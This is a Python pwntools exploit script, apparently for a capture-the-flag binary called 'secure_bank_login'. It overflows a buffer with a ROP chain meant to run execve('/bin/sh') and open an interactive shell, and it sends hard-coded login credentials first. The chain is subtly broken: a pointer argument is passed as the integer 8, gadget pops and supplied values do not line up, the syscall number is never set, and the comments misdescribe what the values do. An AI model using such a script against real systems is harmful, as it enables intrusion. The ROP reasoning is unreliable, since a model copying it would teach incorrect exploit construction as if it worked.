from pwn import *

# Set up the binary and the target address
elf = ELF('./secure_bank_login')

# Use the correct gadgets based on what you found
pop_rdi = 0x040162a  # pop rdi; pop rbp; ret
pop_rsi = 0x0401628  # pop rsi; pop r15; pop rbp; ret
syscall = 0x0401008  # You may need to verify or adjust this syscall address

# Construct the payload
payload = b'A' * 8  # Overflow the 8-byte buffer

# Place /bin/sh on the stack (after the 8-byte buffer)
bin_sh = b"/bin/sh\x00"  # Null-terminated string
payload += bin_sh  # Place "/bin/sh" string directly after the buffer overflow

# Now we need to account for the remaining 292 bytes of stack space
# If your binary uses a standard stack layout, you can fill the rest with padding
# You will need to adjust the exact size if any other padding or saved registers are in the way
payload += b'\x00' * (292 - len(bin_sh))  # Fill the remaining space with padding

# Execve("/bin/sh") syscall setup
# The address of "/bin/sh" is now at the end of the buffer, so we need to pass it in rdi
payload += p64(pop_rdi)  # Prepare rdi (first argument)
payload += p64(8)  # Offset to the address of "/bin/sh" in the payload (after the buffer overflow)
payload += p64(pop_rsi)  # Prepare rsi (second argument)
payload += p64(0)  # Null for environment (no arguments, argv[1] = NULL)
payload += p64(0)  # R15 is not used, but pop it to align stack
payload += p64(syscall)  # Execute the syscall

# Send the payload to the binary
p = process('./secure_bank_login')
p.sendline("Author")
p.sendline("SecretAuthorTech")
p.sendline(payload)
p.interactive()  # Gain interactive shell
